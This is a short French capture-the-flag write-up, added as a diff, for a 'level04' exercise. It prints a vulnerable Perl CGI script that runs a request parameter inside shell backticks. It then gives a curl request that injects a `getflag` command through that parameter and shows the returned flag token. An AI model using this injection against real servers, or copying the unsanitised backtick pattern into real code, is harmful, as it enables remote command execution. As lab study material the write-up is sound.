@@ -1,0 +1,30 @@
+## Methode pour trouver le flag ##
+/*
+*   Format:
+*   - Objectif
+*   commande
+*       -> resultat
+*/
+
+J avais reperé precedement qu il y avait un dossier level04 dans /var/www donc je savais qu il fallait utiliser le web.
+
+- un fichier perl dans le repertoire:
+cat level04.pl
+    -> 
+    #!/usr/bin/perl
+    # localhost:4747 -> base d'ou chercher la solution pour un curl ;)
+    use CGI qw{param}; -> recupere les arguments depuis la requete 
+    print "Content-type: text/html\n\n";
+    sub x {
+        $y = $_[0];
+        print `echo $y 2>&1`; -> quote d'execution donc lui donner getflag devrai fonctionner
+    }
+    x(param("x"));
+
+- executer getflag
+curl -v http://localhost:4747/level04.pl?x=/`getflag/`
+    -> Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+
+Sources:
+    - http://www.biogem.org/downloads/notes/Passing%20Parameters%20via%20CGI.pdf
+    - https://www.cs.ait.ac.th/~on/O/oreilly/perl/learn32/ch18_04.html
